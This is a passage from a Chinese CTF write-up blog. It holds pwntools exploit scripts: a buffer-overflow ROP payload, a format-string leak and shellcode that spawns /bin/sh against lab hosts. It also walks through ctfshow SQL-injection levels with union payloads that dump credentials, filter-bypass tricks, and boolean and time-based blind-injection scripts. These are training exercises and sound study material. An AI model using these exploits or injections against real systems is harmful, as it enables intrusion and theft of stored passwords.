class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> longULONG;<br><span class="hljs-comment">/*初始化函数*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_init</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> k[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)<br>    &#123;<br>        s[i] = i;<br>        k[i] = key[i%Len];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)<br>    &#123;<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<span class="hljs-comment">//交换s[i]和s[j]</span><br>        s[j] = tmp;<br>    &#125;<br>&#125; <br><span class="hljs-comment">/*加解密*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_crypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*Data, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k&lt;Len; k++)<br>    &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j];<span class="hljs-comment">//交换s[x]和s[y]</span><br>        s[j] = tmp;<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span>;<br>        Data[k] ^= s[t];<br>    &#125;<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[]=<br>    &#123;<br>      <span class="hljs-number">0xA7</span>,<span class="hljs-number">0x1A</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0xD8</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0x8C</span>,<span class="hljs-number">0x9B</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0xD2</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xCE</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0xD4</span>,<br> <span class="hljs-number">0xBC</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0xC2</span>,<span class="hljs-number">0x8A</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0xD6</span>,<span class="hljs-number">0xCC</span>,<span class="hljs-number">0xF8</span>,<span class="hljs-number">0xA4</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x2F</span>,<span class="hljs-number">0xE0</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0xB9</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x11</span><br>    &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[]=<span class="hljs-string">&quot;RC4_1s_4w3s0m3&quot;</span>;<br>    <span class="hljs-type">unsigned</span>  <span class="hljs-type">char</span> s[<span class="hljs-number">256</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">rc4_init</span>(s,key,<span class="hljs-number">14</span>);<br>    <span class="hljs-built_in">rc4_crypt</span>(s,flag,<span class="hljs-number">42</span>);<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">42</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,flag[i]);<br>&#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="二进制漏洞审计"><a href="#二进制漏洞审计" class="headerlink" title="二进制漏洞审计"></a>二进制漏洞审计</h1><h2 id="二进制漏洞审计入门指北"><a href="#二进制漏洞审计入门指北" class="headerlink" title="二进制漏洞审计入门指北"></a>二进制漏洞审计入门指北</h2><p>nc连接一下就出来了</p><h2 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a>NotEnoughTime</h2><p>是个数学题，写个脚本交互一下吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>(<span class="hljs-params">io</span>):<br>    <span class="hljs-comment"># 初始交互，发送设置值</span><br>    io.recvuntil(<span class="hljs-string">b&quot;ones.&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;=&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 进入到数学表达式部分</span><br>    io.recvuntil(<span class="hljs-string">b&#x27;PREPARED!&#x27;</span>)<br>    a = io.recvuntil(<span class="hljs-string">b&#x27;=&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 循环处理数学表达式</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 清理接收到的表达式，移除空白字符并替换除法符号</span><br>        aa = re.sub(<span class="hljs-string">r&#x27;[ \t\n\r=]+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, a.decode()).replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 计算表达式的结果</span><br>        ans = <span class="hljs-built_in">eval</span>(aa)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Calculated Answer: <span class="hljs-subst">&#123;ans&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 将计算结果发送回服务器</span><br>        io.sendline(<span class="hljs-built_in">str</span>(ans).encode())<br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 接收下一个表达式</span><br>            a = io.recvuntil(<span class="hljs-string">b&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">except</span> EOFError:<br>            <span class="hljs-comment"># 如果没有更多表达式则跳出循环</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 连接到远程服务，端口为62593</span><br>io = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>, <span class="hljs-number">63631</span>)<br><br><span class="hljs-comment"># 执行工作函数</span><br>work(io)<br><br><span class="hljs-comment"># 保持交互</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="no-more-gets"><a href="#no-more-gets" class="headerlink" title="no_more_gets"></a>no_more_gets</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">io</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;out.&#x27;</span>)  <span class="hljs-comment"># 接收直到指定字符串</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x50</span> + <span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x40101a</span>) + p64(<span class="hljs-number">0x401176</span>)  <span class="hljs-comment"># 构造 payload</span><br>    io.sendline(payload)  <span class="hljs-comment"># 发送 payload</span><br><br><span class="hljs-comment"># 使用正确的 IP 地址</span><br>io = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>, <span class="hljs-number">63945</span>)  <span class="hljs-comment"># 建立远程连接</span><br>exp(io)  <span class="hljs-comment"># 执行 exp 函数</span><br>io.interactive()  <span class="hljs-comment"># 进入交互模式</span><br></code></pre></td></tr></table></figure><h2 id="leak-sth"><a href="#leak-sth" class="headerlink" title="leak_sth"></a>leak_sth</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;192.168.114.1&quot;</span>,<span class="hljs-number">56731</span>)<br>payload=<span class="hljs-string">b&quot;%7$p&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;Your name:\n0x&quot;</span>)<br>data=p.recv(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data=&quot;</span>,data)<br>data=<span class="hljs-built_in">int</span>(data,<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data2=&quot;</span>,<span class="hljs-built_in">hex</span>(data))<br>p.sendline(<span class="hljs-built_in">str</span>(data))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="这是什么？shellcode！"><a href="#这是什么？shellcode！" class="headerlink" title="这是什么？shellcode！"></a>这是什么？shellcode！</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;192.168.114.1&#x27;</span>,<span class="hljs-number">53436</span>)<br><br>shellcode=<span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br><br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-sql注入</title>
    <link href="/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>前言：sql算是最不熟悉的了，写的稍微详细一点吧,目前的ctf赛题是不会出一把梭的题目，实战环境sqlmap可以多用用，题目尽量还是手写。</p><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; or 1=1--+</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">根据id = &#x27;&quot;.$ GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;<br>传入的内容拼接就相当于<br>id=&#x27;1&#x27; or 1=1--+&#x27;limit 1;<br></code></pre></td></tr></table></figure><p>进行了简单的sql绕过</p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>本地加入了返回逻辑，详细可以自己查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,database()%23</span><br></code></pre></td></tr></table></figure><p>首先爆看看库名，发现了<code>ctfshow_web</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>再对所有可能的表进行爆列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user2<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>再进行爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user2%23</span><br></code></pre></td></tr></table></figure><p>最后直接定位到password进行了</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>先用上题的最后payload查看看看，发现not_here,看一下本题的返回逻辑</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>发现有个<code>ctfshow_user3</code>，直接写最后的payload，本题有匹配flag的过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user3%23</span><br></code></pre></td></tr></table></figure><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>在前面的基础上过滤了<code>0-9</code></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>利用replace就行替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;A&#x27;</span>),<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;B&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;C&#x27;</span>),<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;D&#x27;</span>),<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;E&#x27;</span>),<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;F&#x27;</span>),<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;G&#x27;</span>),<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;H&#x27;</span>),<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;I&#x27;</span>),<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;J&#x27;</span>);<br></code></pre></td></tr></table></figure><p>讲数字用字母进行替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#x27;</span>A<span class="hljs-string">&#x27;),2,&#x27;</span>B<span class="hljs-string">&#x27;),3,&#x27;</span>C<span class="hljs-string">&#x27;),4,&#x27;</span>D<span class="hljs-string">&#x27;),5,&#x27;</span>E<span class="hljs-string">&#x27;),6,&#x27;</span>F<span class="hljs-string">&#x27;),7,&#x27;</span>G<span class="hljs-string">&#x27;),8,&#x27;</span>H<span class="hljs-string">&#x27;),9,&#x27;</span>I<span class="hljs-string">&#x27;),0,&#x27;</span>J<span class="hljs-string">&#x27;),&#x27;</span>b<span class="hljs-string">&#x27; from ctfshow_user4 where username=&#x27;</span>flag<span class="hljs-string">&#x27; %23</span><br></code></pre></td></tr></table></figure><p>得到的flag需要进行替换</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>利用盲注得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 构造 Payload</span><br>payload = <span class="hljs-string">&quot;1&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span><br>url = <span class="hljs-string">&quot;http://17641de3-ec90-4f5e-a197-d6bcfc72684d.challenge.ctf.show/api/v4.php?id=&quot;</span><br><br><span class="hljs-comment"># 测试字符是否大于给定的 ASCII 值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_chr</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span>, offset: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url + payload.<span class="hljs-built_in">format</span>(index, offset), timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-comment"># 检查返回内容是否包含关键字</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cluster&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;boom&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Unexpected response for index <span class="hljs-subst">&#123;index&#125;</span>, offset <span class="hljs-subst">&#123;offset&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Request failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 开始盲注过程</span><br>index = <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>max_length = <span class="hljs-number">50</span>  <span class="hljs-comment"># 假设flag最大长度</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(flag) &lt; max_length:<br>    start = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span>  <span class="hljs-comment"># ASCII 可打印字符范围</span><br>    <span class="hljs-keyword">while</span> start &lt; end:<br>        point = (start + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> test_chr(index, point):<br>            start = point + <span class="hljs-number">1</span>  <span class="hljs-comment"># 搜索更大的 ASCII 范围</span><br>        <span class="hljs-keyword">else</span>:<br>            end = point  <span class="hljs-comment"># 搜索更小的 ASCII 范围</span><br>    <span class="hljs-keyword">if</span> start == <span class="hljs-number">32</span>:  <span class="hljs-comment"># 当 start 等于 32 时，意味着没有更多字符</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Finished, flag is: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    flag += <span class="hljs-built_in">chr</span>(start)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Current flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    index += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Final flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>需要先找到接口，输入，最后跑一下脚本</p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>)))<br></code></pre></td></tr></table></figure><p>匹配 ASCII 码表范围内的字符也就是说 字母 数字 符号都显示不出来了，猜测是时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and sleep(3)%23</span><br></code></pre></td></tr></table></figure><p>可以正常运行，写个脚本跑看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://89f1ac82-1428-42c3-9b7a-0c3e5bbdc93c.challenge.ctf.show/api/v5.php?id=&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        payload = <span class="hljs-string">f&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(3),0) %23&quot;</span><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            res = requests.get(url+payload)<br>            stop_time = time.time()<br>            <span class="hljs-keyword">if</span> stop_time - start_time &gt;= <span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法继续推测字符，可能到达结尾或出错。&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>觉得时间长的话可以微调一下时间间隔，不要过短</p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>直接爆出来了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or  1=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>可以bp来fuzz一下，union，select这些被过滤了，这题可以用大小写过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,database()%23</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; Union Select 1,2,password from ctfshow_user%23</span><br></code></pre></td></tr></table></figure><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>可以fuzz一下,这里比较懒我直接看wp了，这里过滤了空格，在sql里可以用<code>/**/</code>来代替空格</p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/or/**/1=1%23</span><br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>常规做法的最后一步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 